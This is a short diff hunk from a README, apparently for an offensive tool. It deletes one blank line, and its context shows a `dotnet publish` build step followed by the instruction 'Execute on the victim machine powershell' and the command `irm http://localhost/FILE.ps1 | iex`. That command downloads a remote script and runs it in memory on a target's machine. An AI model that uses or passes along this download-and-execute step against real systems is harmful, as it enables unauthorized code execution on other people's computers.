@@ -19,7 +19,6 @@ dotnet publish -p:PublishSingleFile=true
 ```
 
 And go to `bin/Release` folder.\
-
 Execute on the victim machine powershell
 ```
 irm http://localhost/FILE.ps1 | iex
